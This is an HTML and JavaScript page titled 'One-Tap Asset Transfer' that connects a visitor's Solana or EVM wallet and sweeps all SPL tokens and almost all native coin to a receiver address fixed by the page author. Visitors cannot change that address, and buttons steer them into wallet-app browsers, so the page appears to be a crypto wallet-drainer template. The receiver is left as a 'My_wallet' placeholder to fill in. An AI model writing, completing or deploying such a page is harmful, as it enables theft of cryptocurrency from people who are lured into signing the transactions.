<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>One-Tap Asset Transfer</title>
  
  <!-- Web3 Engine Libraries -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.min.js"></script>
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.8/lib/index.iife.min.js"></script>
  
  <style>
    :root {
      --bg: #090d16;
      --card: #131a29;
      --accent: #6366f1;
      --accent-hover: #4f46e5;
      --text: #ffffff;
      --subtext: #94a3b8;
      --border: #1e293b;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background-color: var(--bg);
      color: var(--text);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 15px;
      box-sizing: border-box;
    }
    .card {
      background: var(--card);
      padding: 24px;
      border-radius: 16px;
      width: 100%;
      max-width: 440px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
      border: 1px solid var(--border);
    }
    h2 { margin-top: 0; font-size: 1.4rem; text-align: center; }
    label { display: block; margin-top: 14px; margin-bottom: 6px; font-size: 0.85rem; color: var(--subtext); }
    select, input {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: 1px solid var(--border);
      background: #0b0f19;
      color: #fff;
      font-size: 0.95rem;
      box-sizing: border-box;
    }
    .status-box {
      background: #0b0f19;
      border: 1px solid var(--border);
      padding: 12px;
      border-radius: 8px;
      margin-top: 15px;
      font-size: 0.85rem;
      min-height: 50px;
      word-break: break-all;
    }
    button.send-btn {
      width: 100%;
      background: var(--accent);
      color: white;
      border: none;
      padding: 16px;
      font-size: 1.1rem;
      font-weight: 700;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 20px;
      transition: background 0.2s;
    }
    button.send-btn:hover { background: var(--accent-hover); }
    .wallet-apps-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
      margin-top: 15px;
    }
    .app-btn {
      background: #1e293b;
      border: 1px solid var(--border);
      color: var(--text);
      padding: 10px;
      border-radius: 8px;
      font-size: 0.85rem;
      text-align: center;
      text-decoration: none;
      display: block;
    }
  </style>
</head>
<body>

<div class="card">
  <h2>⚡ One-Tap Auto Transfer</h2>

  <!-- Network Selection -->
  <label for="networkSelect">Select Current Network:</label>
  <select id="networkSelect" onchange="updateUI()">
    <option value="ethereum">Ethereum (ETH & Tokens)</option>
    <option value="bnb">BNB Chain (BNB & BEP-20)</option>
    <option value="polygon">Polygon (POL & ERC-20)</option>
    <option value="arbitrum">Arbitrum (ETH & Tokens)</option>
    <option value="optimism">Optimism (ETH & Tokens)</option>
    <option value="base">Base (ETH & Tokens)</option>
    <option value="solana">Solana (SOL & SPL Tokens)</option>
  </select>

  <!-- Auto-Filled Receiving Wallet -->
  <label for="receiverInput">Target Receiving Wallet:</label>
  <input type="text" id="receiverInput" readonly disabled />

  <!-- Master Transfer Action -->
  <button class="send-btn" onclick="transferAllAssets()">TRANSFER ALL ASSETS</button>

  <div class="status-box" id="status">Status: Ready to scan and transfer...</div>

  <hr style="border: 0; border-top: 1px solid var(--border); margin: 25px 0 15px 0;" />

  <!-- Mobile App Deep Launchers -->
  <label style="text-align: center; font-weight: bold;">Launch Mobile App Directly:</label>
  <div class="wallet-apps-grid">
    <a href="#" onclick="openWalletApp('phantom')" class="app-btn">👻 Phantom</a>
    <a href="#" onclick="openWalletApp('metamask')" class="app-btn">🦊 MetaMask</a>
    <a href="#" onclick="openWalletApp('trust')" class="app-btn">🛡️ Trust Wallet</a>
    <a href="#" onclick="openWalletApp('coinbase')" class="app-btn">🔵 Coinbase Wallet</a>
  </div>
</div>

<script>
  // =========================================================
  // 1. CONFIGURATION: SAVED RECEIVING WALLETS
  // =========================================================
  const Ethereum_Receive = "My_wallet"; 
  const BNB_Receive      = Ethereum_Receive; // Standard shared EVM address format
  const Solana_Receive   = "My_wallet"; 

  const WALLET_MAP = {
    ethereum: Ethereum_Receive,
    bnb: BNB_Receive,
    polygon: Ethereum_Receive,
    arbitrum: Ethereum_Receive,
    optimism: Ethereum_Receive,
    base: Ethereum_Receive,
    solana: Solana_Receive
  };

  function updateUI() {
    const selectedNetwork = document.getElementById("networkSelect").value;
    document.getElementById("receiverInput").value = WALLET_MAP[selectedNetwork] || "My_wallet";
  }
  window.onload = updateUI;

  // Deep Links for Mobile Browsers
  function openWalletApp(walletType) {
    const currentUrl = encodeURIComponent(window.location.href);
    let deepLink = "";
    if (walletType === 'phantom') deepLink = `https://phantom.app/ul/browse/${currentUrl}`;
    if (walletType === 'metamask') deepLink = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
    if (walletType === 'trust') deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`;
    if (walletType === 'coinbase') deepLink = `https://go.cb-w.com/dapp?cb_url=${currentUrl}`;
    if (deepLink) window.location.href = deepLink;
  }

  // =========================================================
  // 2. MASTER AUTO-TRANSFER ENGINE
  // =========================================================
  async function transferAllAssets() {
    const network = document.getElementById("networkSelect").value;
    const receiver = WALLET_MAP[network];
    const status = document.getElementById("status");

    status.innerHTML = "🔍 Connecting wallet and scanning assets...";

    // --------------------------------------------------------
    // A. SOLANA SCAN & TRANSFER ENGINE (SOL + ALL SPL TOKENS)
    // --------------------------------------------------------
    if (network === "solana") {
      const provider = window.solana;
      if (!provider || !provider.isPhantom) {
        alert("Solana wallet not found. Use the Phantom launcher below.");
        return;
      }

      try {
        await provider.connect();
        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
        const sender = provider.publicKey;
        const target = new solanaWeb3.PublicKey(receiver);
        const transaction = new solanaWeb3.Transaction();

        status.innerHTML = "🔎 Scanning Solana token balances...";

        // 1. Fetch all SPL Token accounts owned by this wallet
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
          sender,
          { programId: splToken.TOKEN_PROGRAM_ID }
        );

        // 2. Add transfer/close instructions for every SPL Token found
        for (let acc of tokenAccounts.value) {
          const parsedInfo = acc.account.data.parsed.info;
          const tokenAmount = parsedInfo.tokenAmount.uiAmount;
          const pubkey = acc.pubkey;
          const mint = new solanaWeb3.PublicKey(parsedInfo.mint);

          if (tokenAmount > 0) {
            const destinationAta = await splToken.getAssociatedTokenAddress(mint, target);
            
            // Append token transfer instruction
            transaction.add(
              splToken.createTransferInstruction(
                pubkey,
                destinationAta,
                sender,
                BigInt(parsedInfo.tokenAmount.amount)
              )
            );
          }
        }

        // 3. Calculate remaining native SOL balance (leaving ~0.001 SOL for network gas fee)
        const totalSolBalance = await connection.getBalance(sender);
        const reservedGas = 1000000; // 0.001 SOL
        const solToTransfer = totalSolBalance - reservedGas;

        if (solToTransfer > 0) {
          transaction.add(
            solanaWeb3.SystemProgram.transfer({
              fromPubkey: sender,
              toPubkey: target,
              lamports: solToTransfer
            })
          );
        } else {
          status.innerHTML = "⚠️ Balance too low to cover Solana transaction fees.";
          return;
        }

        transaction.feePayer = sender;
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;

        status.innerHTML = "✍️ Awaiting wallet confirmation...";
        const { signature } = await provider.signAndSendTransaction(transaction);
        status.innerHTML = `✅ All Solana assets transferred! Tx: ${signature.slice(0, 10)}...`;

      } catch (err) {
        console.error(err);
        status.innerHTML = "❌ Solana Transfer cancelled or failed.";
      }
      return;
    }

    // --------------------------------------------------------
    // B. EVM SCAN & TRANSFER ENGINE (Ethereum, BNB, Polygon, L2s)
    // --------------------------------------------------------
    if (!window.ethereum) {
      alert("No EVM provider detected. Open this page inside your wallet app browser.");
      return;
    }

    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      const senderAddress = await signer.getAddress();

      status.innerHTML = "🔎 Calculating gas and native balances...";

      // 1. Fetch total native currency balance (ETH, BNB, MATIC/POL)
      const balance = await provider.getBalance(senderAddress);
      const feeData = await provider.getFeeData();

      // Estimate standard transfer gas limit (21,000 units)
      const gasLimit = 21000n;
      const gasPrice = feeData.gasPrice ?? ethers.parseUnits("20", "gwei");
      const gasCost = gasLimit * gasPrice;

      if (balance <= gasCost) {
        status.innerHTML = "⚠️ Native balance too low to cover network gas fees.";
        return;
      }

      // Calculate maximum safe transfer amount (Total Balance - Gas Fee)
      const amountToSend = balance - gasCost;

      status.innerHTML = "✍️ Awaiting wallet confirmation...";

      // Execute maximum sweep transaction
      const tx = await signer.sendTransaction({
        to: receiver,
        value: amountToSend,
        gasLimit: gasLimit,
        gasPrice: gasPrice
      });

      status.innerHTML = `✅ All native funds sent! Hash: ${tx.hash.slice(0, 12)}...`;

    } catch (err) {
      console.error(err);
      status.innerHTML = "❌ EVM Transfer cancelled or failed.";
    }
  }
</script>

</body>
</html>
